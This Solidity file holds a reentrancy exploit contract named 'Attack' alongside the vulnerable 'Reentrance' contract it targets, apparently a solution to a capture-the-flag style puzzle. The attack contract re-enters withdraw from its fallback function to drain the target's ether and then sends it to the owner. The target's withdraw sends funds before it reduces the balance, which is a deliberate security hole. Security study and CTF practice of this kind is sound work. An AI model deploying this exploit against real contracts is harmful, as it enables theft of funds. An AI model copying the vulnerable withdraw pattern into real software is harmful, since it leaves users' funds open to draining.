// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    address payable public owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function callWithdrawBalance(address payable _address) public {
        uint amount = 5000000000000000;
        Reentrance(_address).withdraw(amount);
    }
    
    fallback() external payable {
        callWithdrawBalance(msg.sender);
    }
    
    function drain() public {
        owner.transfer(address(this).balance);
    }
}

contract Reentrance {
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}